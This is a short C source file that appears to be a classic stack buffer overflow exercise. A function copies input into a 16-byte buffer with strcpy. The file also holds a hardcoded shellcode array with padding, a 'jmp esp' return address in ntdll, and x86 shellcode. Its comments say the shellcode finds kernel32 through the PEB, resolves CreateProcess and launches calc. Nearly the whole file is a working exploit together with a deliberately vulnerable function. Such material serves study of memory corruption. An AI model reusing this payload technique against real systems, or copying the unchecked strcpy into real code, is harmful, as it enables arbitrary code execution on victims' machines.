//#include "stdio.h"
#include "string.h"
//#include"stdlib.h"
//#include"conio.h"
//#include"Windows.h"
//#include <string>

int vuln(char* str) {
	char buf[16];
strcpy(buf, str);
return 0;}


char shellcode[400] =
"00000000000000000000"      //filling the buffer and old ebp
"\xed\x1e\x94\x7c"          //adress of jmp esp in ntdll
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
"\x45\x81\x3e""Crea""\x75"   //
"\xf2\x81\x7e\x08""oces"     //finding fucntoin "Createprocess" obviously
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66" //in seh-structures st fs:[0]  1 dw - next_p  2 dw-exeption pointer; searching for kernel.dll
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" 
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" // and after that fnding a function in the export table
"\xb1\xff\x53\xe2\xfd"
"\x68" "calc"  //push
//"\x68" ".bat"
//"\x68" "vuln"
"\x89\xe2\x52\x52\x53\x53"
"\x53\x53\x53\x53\x52\x53\xff\xd7";  //last two call the func
int main()
{
vuln(shellcode);
return 0; 
}
